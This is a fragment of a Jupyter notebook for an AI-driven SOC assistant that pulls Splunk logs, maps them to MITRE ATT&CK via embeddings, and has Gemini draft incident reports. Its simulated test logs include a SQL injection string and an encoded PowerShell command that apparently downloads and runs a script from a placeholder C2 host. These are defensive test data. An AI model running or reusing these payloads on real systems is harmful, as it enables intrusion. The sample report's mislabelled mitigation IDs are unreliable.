    "    connection_url = f\"https://{SPLUNK_HOST}:{SPLUNK_PORT}\"\n",
    "    print(f\"Attempting to connect to Splunk at {connection_url}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"https\", # Changed from http - Crucial for 8089\n",
    "            verify=False # IMPORTANT: For testing with self-signed certs. Use True with a proper CA bundle in production!\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        kwargs = {\n",
    "            \"earliest_time\": earliest_time,\n",
    "            \"latest_time\": latest_time,\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\"\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        print(f\"Splunk Job ID: {job.sid}\")\n",
    "        # Wait for the job to complete\n",
    "        while not job.is_ready():\n",
    "            time.sleep(0.1)\n",
    "            # Print the current dispatch state of the job for more detailed debugging\n",
    "            print(f\"Job {job.sid} status: {job.content.get('dispatchState')}\") \n",
    "\n",
    "        # After job is ready, check if it's done or if there are messages\n",
    "        if job.is_done():\n",
    "            print(f\"Splunk search job {job.sid} is DONE. Final dispatch state: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Check for messages even if done (warnings, etc.)\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job to free resources on Splunk\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk for Job ID {job.sid}.\")\n",
    "            return events\n",
    "        else: # This block handles cases where the job might not complete successfully\n",
    "            print(f\"Splunk search job {job.sid} did not complete successfully. Final status: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Print any error/warning messages\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "    \n",
    "# --- Embedding & ChromaDB Functions ---\n",
    "def get_embedding(text):\n",
    "    \"\"\"Generates an embedding for the given text using the specified Gemini embedding model.\"\"\"\n",
    "    try:\n",
    "        # Use RETRIEVAL_DOCUMENT for texts meant to be retrieved (like knowledge base entries)\n",
    "        response = genai.embed_content(model=embedding_model, content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding for text (first 50 chars): '{text[:50]}...': {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH):\n",
    "    \"\"\"\n",
    "    Loads MITRE ATT&CK techniques AND their associated mitigations from a STIX 2.x JSON file.\n",
    "    \"\"\"\n",
    "    print(f\"Loading MITRE ATT&CK data from {stix_json_path} using stix2...\")\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "        \n",
    "        attack_data_points = []\n",
    "        mitigation_data_points = []\n",
    "\n",
    "        # Query for all Attack Pattern objects (techniques)\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "\n",
    "        for tech in techniques:\n",
    "            mitre_id = None\n",
    "            for ext_ref in tech.external_references:\n",
    "                if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                    if ext_ref['external_id'].startswith('T'):\n",
    "                        mitre_id = ext_ref['external_id']\n",
    "                        break\n",
    "            if not mitre_id:\n",
    "                continue\n",
    "\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            \n",
    "            tactics_names = []\n",
    "            if hasattr(tech, 'x_mitre_tactic_refs'):\n",
    "                for tactic_ref_id in tech.x_mitre_tactic_refs:\n",
    "                    tactic_sdo = stix_store.get(tactic_ref_id)\n",
    "                    if tactic_sdo and tactic_sdo.type == 'tactic':\n",
    "                        tactics_names.append(tactic_sdo.name)\n",
    "            tactics_str = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "            \n",
    "            # Construct full text for embedding for techniques\n",
    "            full_tech_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {tactics_str}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "            \n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_tech_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_str,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "\n",
    "            # --- NEW: Find mitigations for this technique ---\n",
    "            # Query for relationships where this technique is the source and the relationship is 'mitigates'\n",
    "            mitigation_relationships = stix_store.query(\n",
    "                Filter('source_ref', '=', tech.id),\n",
    "                Filter('relationship_type', '=', 'mitigates')\n",
    "            )\n",
    "            \n",
    "            for rel in mitigation_relationships:\n",
    "                mitigation_sdo = stix_store.get(rel.target_ref) # Get the Course-Of-Action object\n",
    "                if mitigation_sdo and mitigation_sdo.type == 'course-of-action':\n",
    "                    mitigation_id = None\n",
    "                    for ext_ref in mitigation_sdo.external_references:\n",
    "                        if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                            if ext_ref['external_id'].startswith('M'): # Mitigations start with 'M'\n",
    "                                mitigation_id = ext_ref['external_id']\n",
    "                                break\n",
    "                    \n",
    "                    if mitigation_id:\n",
    "                        mitigation_description = mitigation_sdo.description if hasattr(mitigation_sdo, 'description') else \"No description available.\"\n",
    "                        full_mitigation_text = (\n",
    "                            f\"MITRE ATT&CK Mitigation: {mitigation_sdo.name} (ID: {mitigation_id})\\n\"\n",
    "                            f\"Description: {mitigation_description}\\n\"\n",
    "                            f\"Mitigates Technique: {tech.name} ({mitre_id})\"\n",
    "                        )\n",
    "                        \n",
    "                        mitigation_data_points.append({\n",
    "                            \"id\": mitigation_id, # Use the Mitigation ID\n",
    "                            \"text\": full_mitigation_text,\n",
    "                            \"metadata\": {\n",
    "                                \"type\": \"mitre_attack_mitigation\", # New type\n",
    "                                \"mitigation_id\": mitigation_id,\n",
    "                                \"mitigation_name\": mitigation_sdo.name,\n",
    "                                \"mitigates_technique_id\": mitre_id, # Link back to the technique\n",
    "                                \"source_file\": stix_json_path\n",
    "                            }\n",
    "                        })\n",
    "        \n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        print(f\"Loaded {len(mitigation_data_points)} MITRE ATT&CK mitigations.\")\n",
    "\n",
    "        return attack_data_points + mitigation_data_points # Combine for single populate call\n",
    "\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/ and place it in the script's directory.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge data points, avoiding duplicates.\"\"\"\n",
    "    print(f\"Attempting to add {len(data_points)} documents to the knowledge base.\")\n",
    "    \n",
    "    # Get existing IDs to prevent adding duplicates\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result.get('ids', []))\n",
    "\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            # Generate a unique ID if not provided (e.g., for custom knowledge)\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "\n",
    "        if unique_id in existing_ids:\n",
    "            # print(f\"Skipping existing document with ID: {unique_id}\") # Uncomment for verbose debugging\n",
    "            continue\n",
    "\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding is not None: # Ensure embedding was successfully generated\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Skipping document due to embedding failure: {dp['text'][:50]}...\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        try:\n",
    "            security_collection.add(\n",
    "                documents=docs_to_add,\n",
    "                embeddings=embeddings_to_add,\n",
    "                metadatas=metadatas_to_add,\n",
    "                ids=ids_to_add\n",
    "            )\n",
    "            print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Error adding documents to ChromaDB: {e}\")\n",
    "    else:\n",
    "        print(\"No new unique documents to add to the vector store.\")\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    \"\"\"\n",
    "    Searches the ChromaDB knowledge base for relevant documents.\n",
    "    Args:\n",
    "        query_text (str): The text to search for.\n",
    "        n_results (int): Number of results to return.\n",
    "        filter_metadata (dict, optional): A dictionary to filter results by metadata.\n",
    "                                          E.g., {\"type\": \"mitre_attack_technique\"}.\n",
    "    Returns:\n",
    "        dict: ChromaDB query results (documents, distances, metadatas).\n",
    "    \"\"\"\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding is not None:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata # Apply metadata filtering if provided\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "# --- AI Report Generation Function ---\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    \"\"\"\n",
    "    Generates a comprehensive security incident report using Gemini.\n",
    "    `relevant_knowledge` now primarily contains suggested mitigations.\n",
    "    \"\"\"\n",
    "    # Format MITRE details for the prompt\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name', 'N/A')} ({mapping.get('technique_id', 'N/A')})\\n\"\n",
    "            if mapping.get('tactics') and mapping['tactics'] != 'N/A':\n",
    "                mitre_details_str += f\"  **Tactics:** {mapping['tactics']}\\n\"\n",
    "            description_text = str(mapping.get('description', 'No description.')).strip()\n",
    "            # Extract just the MITRE technique description for brevity in report\n",
    "            clean_description = description_text.split(\"Description: \")[1].split(\"\\nURL:\")[0].strip() if \"Description: \" in description_text else description_text\n",
    "            mitre_details_str += f\"  **Description:** {clean_description[:200]}...\\n\"\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score', 0.0):.4f}\\n\"\n",
    "\n",
    "    # Main prompt for Gemini\n",
    "    prompt = f\"\"\"\n",
    "You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, potential MITRE ATT&CK mappings, and recommended mitigations.\n",
    "\n",
    "---\n",
    "**Splunk Logs (Raw Data for Context):**\n",
    "{splunk_logs}\n",
    "\n",
    "---\n",
    "**Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "{mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "---\n",
    "**Recommended Mitigations (from Knowledge Base):**\n",
    "{relevant_knowledge if relevant_knowledge else \"No specific mitigation recommendations found. Consider general security best practices.\"}\n",
    "\n",
    "---\n",
    "**Incident Summary (if provided by human analyst):**\n",
    "{incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "---\n",
    "**Instructions for Report Generation:**\n",
    "1.  **Incident Title:** Create a clear and descriptive title for the incident.\n",
    "2.  **Date/Time of Detection:** Extract the earliest and latest timestamps from the logs. Provide a range if multiple times.\n",
    "3.  **Affected Systems/Users:** Identify specific hosts, IP addresses, or users mentioned in the logs.\n",
    "4.  **Description of Incident:** Summarize the observed events chronologically. **Crucially, explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques, referencing their IDs and names from the provided mappings.**\n",
    "5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified (e.g., \"T1078 - Valid Accounts, T1110 - Brute Force\").\n",
    "6.  **Impact:** Briefly describe the potential impact of this incident (e.g., data breach, service disruption, account compromise, unauthorized access).\n",
    "7.  **Recommended Actions/Remediation:** Based on the identified MITRE techniques and the **\"Recommended Mitigations\"** section, suggest immediate and long-term actions for containment, eradication, and recovery. If no specific mitigations are found, provide general best practices based on the MITRE techniques.\n",
    "8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "9.  **Analyst Notes:** Any other observations, open questions, or next steps for further investigation.\n",
    "\n",
    "Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "\"\"\"\n",
    "    try:\n",
    "        response = llm.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query ---\")\n",
    "    print(f\"DEBUG: Splunk query string:\\n```\\n{splunk_query}\\n```\")\n",
    "\n",
    "    splunk_service = connect_to_splunk()\n",
    "\n",
    "    if splunk_service:\n",
    "        print(f\"DEBUG: Successfully obtained Splunk service object. Type: {type(splunk_service)}\")\n",
    "    else:\n",
    "        print(\"DEBUG: Splunk service object is None. Connection likely failed or returned None.\")\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query, earliest_time=\"-24h\", latest_time=\"now\")\n",
    "\n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "        return generate_incident_report(\"No logs retrieved.\", \"No relevant knowledge.\", [], incident_summary)\n",
    "\n",
    "    combined_log_text = \" \".join([event.get('_raw', '') for event in raw_splunk_events])\n",
    "\n",
    "    # relevant_knowledge_text will specifically contain mitigations now\n",
    "    relevant_knowledge_text = \"\" \n",
    "\n",
    "    # Search for relevant MITRE ATT&CK techniques\n",
    "    mitre_search_results = search_security_knowledge_base(\n",
    "        combined_log_text, \n",
    "        n_results=5, \n",
    "        filter_metadata={\"type\": \"mitre_attack_technique\"} # Explicitly search only techniques\n",
    "    )\n",
    "    \n",
    "    mitre_mappings = []\n",
    "    if mitre_search_results and mitre_search_results['documents']:\n",
    "        for i in range(len(mitre_search_results['documents'][0])):\n",
    "            doc = mitre_search_results['documents'][0][i]\n",
    "            meta = mitre_search_results['metadatas'][0][i]\n",
    "            dist = mitre_search_results['distances'][0][i]\n",
    "\n",
    "            # Similarity is 1 - (distance^2 / 2) for normalized vectors and Euclidean (L2) distance\n",
    "            similarity_score = 1 - (dist**2 / 2) \n",
    "            \n",
    "            if similarity_score > 0.7: # Threshold for considering a MITRE mapping relevant\n",
    "                mitre_mappings.append({\n",
    "                    \"technique_id\": meta.get('technique_id'),\n",
    "                    \"technique_name\": meta.get('technique_name'),\n",
    "                    \"tactics\": meta.get('tactics'),\n",
    "                    \"description\": doc, # The full text of the document\n",
    "                    \"distance_score\": similarity_score # Pass the calculated similarity\n",
    "                })\n",
    "\n",
    "    # --- NEW: Search for relevant MITRE ATT&CK Mitigations ---\n",
    "    # This search uses a higher threshold or different strategy as it's for 'recommended actions'\n",
    "    # The query for mitigations could be based on the identified techniques or the raw log text.\n",
    "    # Let's try searching based on the identified techniques for more relevant mitigations.\n",
    "    mitigations_text_to_query = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitigations_text_to_query = \" \".join([m['description'] for m in mitre_mappings])\n",
    "    else:\n",
    "        mitigations_text_to_query = combined_log_text # Fallback to raw logs if no techniques found\n",
    "\n",
    "    relevant_mitigations_results = search_security_knowledge_base(\n",
    "        mitigations_text_to_query,\n",
    "        n_results=3, # Get top 3 most relevant mitigations\n",
    "        filter_metadata={\"type\": \"mitre_attack_mitigation\"} # Explicitly search only mitigations\n",
    "    )\n",
    "    \n",
    "    if relevant_mitigations_results and relevant_mitigations_results['documents']:\n",
    "        relevant_knowledge_text = \"\\n**Recommended Mitigations (from MITRE ATT&CK):**\\n\"\n",
    "        for i in range(len(relevant_mitigations_results['documents'][0])):\n",
    "            doc = relevant_mitigations_results['documents'][0][i]\n",
    "            meta = relevant_mitigations_results['metadatas'][0][i]\n",
    "            dist = relevant_mitigations_results['distances'][0][i]\n",
    "            similarity_score = 1 - (dist**2 / 2) # Assuming normalized vectors and Euclidean (L2) distance\n",
    "\n",
    "            if similarity_score > 0.6: # A slightly lower threshold for suggesting mitigations\n",
    "                relevant_knowledge_text += (\n",
    "                    f\"* **Mitigation:** {meta.get('mitigation_name')} (ID: {meta.get('mitigation_id')})\\n\"\n",
    "                    f\"  **Description:** {doc.split('Description: ')[1].split('Mitigates Technique:')[0].strip()[:200]}...\\n\" # Extract just description\n",
    "                    f\"  **Similarity Score:** {similarity_score:.4f}\\n\"\n",
    "                )\n",
    "    \n",
    "    # Generate the final report\n",
    "    report = generate_incident_report(\n",
    "        \"\\n\".join([event.get('_raw', '') for event in raw_splunk_events]),\n",
    "        relevant_knowledge_text, # Pass the found mitigations as \"relevant_knowledge\"\n",
    "        mitre_mappings,\n",
    "        incident_summary\n",
    "    )\n",
    "    return report\n",
    "\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting AI SOC Analyst Assistant (Full Architecture) ---\")\n",
    "\n",
    "    # --- Step 0: Ensure Security Knowledge Base is Populated ---\n",
    "    print(\"\\n--- Checking/Populating Security Knowledge Base ---\")\n",
    "    \n",
    "    # Check if MITRE data (techniques and mitigations) needs to be populated\n",
    "    total_docs_in_db = security_collection.count()\n",
    "    needs_mitre_population = False\n",
    "    \n",
    "    if total_docs_in_db == 0:\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. Populating MITRE ATT&CK techniques and mitigations.\")\n",
    "    else:\n",
    "        # Corrected way to check counts of specific types in ChromaDB\n",
    "        try:\n",
    "            tech_ids = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])['ids']\n",
    "            miti_ids = security_collection.get(where={\"type\": \"mitre_attack_mitigation\"}, include=[])['ids']\n",
    "            tech_count = len(tech_ids)\n",
    "            miti_count = len(miti_ids)\n",
    "            \n",
    "            if tech_count == 0 or miti_count == 0:\n",
    "                needs_mitre_population = True\n",
    "                print(f\"Missing MITRE techniques ({tech_count}) or mitigations ({miti_count}). Repopulating...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data (techniques: {tech_count}, mitigations: {miti_count}) already present.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Error checking for existing MITRE data: {e}. Assuming MITRE data needs population.\")\n",
    "            needs_mitre_population = True\n",
    "\n",
    "    if needs_mitre_population:\n",
    "        # Clear existing collection if we are repopulating to ensure consistency\n",
    "        print(\"Clearing existing ChromaDB collection to repopulate with fresh MITRE data...\")\n",
    "        try:\n",
    "            chroma_client.delete_collection(SECURITY_COLLECTION_NAME)\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Could not delete collection (might not exist): {e}\")\n",
    "        security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME) # Recreate\n",
    "        \n",
    "        mitre_all_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n",
    "        if mitre_all_data_points:\n",
    "            populate_security_knowledge_base(mitre_all_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. AI mapping might be less effective.\")\n",
    "    \n",
    "    # Removed the specific 'sample_security_knowledge' array and its population logic here.\n",
    "    # If you later want to add other custom knowledge (playbooks, past incidents) \n",
    "    # that are NOT MITRE techniques/mitigations, you would add them here using\n",
    "    # populate_security_knowledge_base with appropriate 'type' metadata (e.g., {\"type\": \"playbook\"}).\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run a combined simulated scenario ---\n",
    "    # This Splunk query generates mock logs that hint at various security events.\n",
    "    splunk_simulated_logs = \"\"\"| makeresults count=6\n",
    "| streamstats count as rn\n",
    "| eval _time = case(\n",
    "    rn=1, relative_time(now(), \"-30s\"),\n",
    "    rn=2, relative_time(now(), \"-25s\"),\n",
    "    rn=3, relative_time(now(), \"-20s\"),\n",
    "    rn=4, relative_time(now(), \"-15s\"),\n",
    "    rn=5, relative_time(now(), \"-10s\"),\n",
    "    rn=6, relative_time(now(), \"-5s\")\n",
    "  )\n",
    "| eval host = case(\n",
    "    rn <= 5, \"webserver-01\",\n",
    "    rn=6, \"endpoint-05\"\n",
    "  )\n",
    "| eval source = case(\n",
    "    rn <= 4, \"/var/log/auth.log\",\n",
    "    rn=5, \"/var/log/apache2/access.log\",\n",
    "    rn=6, \"PowerShell Operational Log\"\n",
    "  )\n",
    "| eval _raw = case(\n",
    "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\\\" 404 200 \\\\\"-\\\\\" \\\\\"Mozilla/5.0\\\\\"\",\n",
    "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vb21haW4vcHNhYXlsb2FkLnBzYDAiKQAKAA==\"\n",
    "  )\n",
    "| table _time, host, source, _raw\n",
    "| sort _time\"\"\"\n",
    "\n",
    "    print(\"\\n\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "    incident_report = ai_soc_analyst_assistant(\n",
    "        splunk_simulated_logs,\n",
    "        incident_summary=\"Simulated multiple failed SSH login attempts, a successful login, an attempted SQL Injection, and an encoded PowerShell command on an endpoint.\"\n",
    "    )\n",
    "    print(\"\\n--- Final Incident Report ---\")\n",
    "    print(incident_report)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "77df4c84",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Starting AI SOC Analyst Assistant (Full Architecture) ---\n",
      "\n",
      "--- Checking/Populating Security Knowledge Base ---\n",
      "MITRE ATT&CK data (techniques: 823, mitigations: 268) already present.\n",
      "\n",
      "Total unique documents in knowledge base: 1091\n",
      "\n",
      "\n",
      "=== Running Combined Simulated Scenario (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query ---\n",
      "DEBUG: Splunk query string:\n",
      "```\n",
      "search index=\"main\" source=\"archive.zip:*\" host=\"DESKTOP-48V92VC\" \"Severity Level\"=\"Medium\" | head 10\n",
      "```\n",
      "Attempting to connect to Splunk at https://127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "DEBUG: Successfully obtained Splunk service object. Type: <class 'splunklib.client.Service'>\n",
      "Retrieving data from Splunk...\n",
      "Attempting to run Splunk query:\n",
      "```\n",
      "search index=\"main\" source=\"archive.zip:*\" host=\"DESKTOP-48V92VC\" \"Severity Level\"=\"Medium\" | head 10\n",
      "```\n",
      "Splunk Job ID: 1748160431.166\n",
      "Job 1748160431.166 status: PARSING\n",
      "Splunk search job 1748160431.166 is DONE. Final dispatch state: DONE\n",
      "Successfully retrieved 10 events from Splunk for Job ID 1748160431.166.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\mohamed elmadany\\AppData\\Local\\Temp\\ipykernel_22952\\2900270773.py:100: DeprecatedWarning: ResultsReader is deprecated. Use the JSONResultsReader function instead in conjuction with the 'output_mode' query param set to 'json'\n",
      "  reader = results.ResultsReader(job.results())\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "--- Final Incident Report ---\n",
      "## Incident Report\n",
      "\n",
      "**Incident Title:** Potential Distributed Denial of Service (DDoS) and Malware Activity Detected\n",
      "\n",
      "**Date/Time of Detection:** 2023-10-10 00:59:20 - 2023-10-11 19:34:23\n",
      "\n",
      "**Affected Systems/Users:**\n",
      "*   IP Addresses: 22.36.249.229, 169.96.251.75, 15.87.212.52, 155.139.226.246, 117.123.202.179, 76.155.186.198, 84.187.46.81, 13.165.19.36, 109.202.200.248, 34.41.151.160, 111.103.192.212, 72.99.102.231, 204.226.111.197, 159.138.159.86, 220.71.249.174, 66.180.126.45, 14.102.21.108, 109.198.45.7, 189.70.191.200, 21.131.89.145\n",
      "*   Users: Vihaan Randhawa, Ahana Wable, Anika Shan, Aradhya Rajagopal, Jiya Kant, Kanav Chand, Tejas Gulati, Pihu Chawla, Zaina Kumar, Khushi Char\n",
      "\n",
      "**Description of Incident:**\n",
      "\n",
      "Multiple alerts were triggered between 2023-10-10 and 2023-10-11 involving network traffic and potential malicious activity. The logs indicate potential signs of DDoS attacks, as well as malware infections. Specific patterns (\"Known Pattern A\" and \"Known Pattern B\") were detected. Some of the alerts were blocked or ignored, while others were logged and/or triggered alerts, specifically referencing the DNS and HTTP protocols.\n",
      "\n",
      "The incident aligns with the following MITRE ATT&CK Techniques:\n",
      "\n",
      "*   **T1499.003 - Application Exhaustion Flood:** Multiple logs indicate the detection of a DDoS attack, which could exhaust application resources, leading to a denial of service.\n",
      "*   **T1071 - Application Layer Protocol:** The logs show the use of HTTP, DNS, and FTP protocols, which adversaries might leverage to blend in with legitimate traffic.\n",
      "*   **T1562 - Impair Defenses:** The logs indicate activity related to intrusion detection and alerting mechanisms, which adversaries might try to impair to evade detection.\n",
      "\n",
      "**Attack Vector/Technique (MITRE ATT&CK IDs and names):**\n",
      "\n",
      "*   T1499.003 - Application Exhaustion Flood\n",
      "*   T1071 - Application Layer Protocol\n",
      "*   T1562 - Impair Defenses\n",
      "\n",
      "**Impact:**\n",
      "\n",
      "Potential for service disruption due to DDoS attacks, potential malware infections compromising system integrity and confidentiality, and potential exfiltration of sensitive data. There's a risk of further system compromise if defenses are impaired.\n",
      "\n",
      "**Recommended Actions/Remediation:**\n",
      "\n",
      "1.  **Immediate Actions:**\n",
      "    *   Investigate the source IP addresses involved in the DDoS alerts and implement blocking rules at the firewall.\n",
      "    *   Analyze the alerts related to \"Known Pattern A\" and \"Known Pattern B\" to determine the specific threats they represent.\n",
      "    *   Isolate affected systems to prevent further spread of potential malware.\n",
      "    *   Run full system scans on affected systems using updated antivirus and anti-malware software.\n",
      "\n",
      "2.  **Long-Term Actions:**\n",
      "    *   Implement rate limiting and traffic filtering to mitigate DDoS attacks.\n",
      "    *   Enhance intrusion detection and prevention systems to better identify and block malicious traffic.\n",
      "    *   Review and strengthen firewall rules to restrict unauthorized access.\n",
      "    *   Implement network segmentation to limit the impact of potential breaches.\n",
      "    *   Enforce the Principle of Least Privilege. Limit privileges of user accounts and groups so that only specific administrators can make changes to critical application and service configurations. **(Mitigation ID: T1489 - Service Stop Mitigation)**\n",
      "    *   Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. **(Mitigation ID: T1133 - External Remote Services Mitigation)**\n",
      "\n",
      "**Status:** New Incident\n",
      "\n",
      "**Analyst Notes:**\n",
      "\n",
      "*   Further investigation is required to determine the specific nature of \"Known Pattern A\" and \"Known Pattern B.\"\n",
      "*   Investigate the user agents associated with the detected activity.\n",
      "*   Correlate this incident with other security events to identify any related activity.\n",
      "*   The UDP protocol being used extensively warrants further analysis of the involved packets to ascertain the nature of the data and control activities.\n",
      "\n"
     ]
    }
   ],
   "source": [
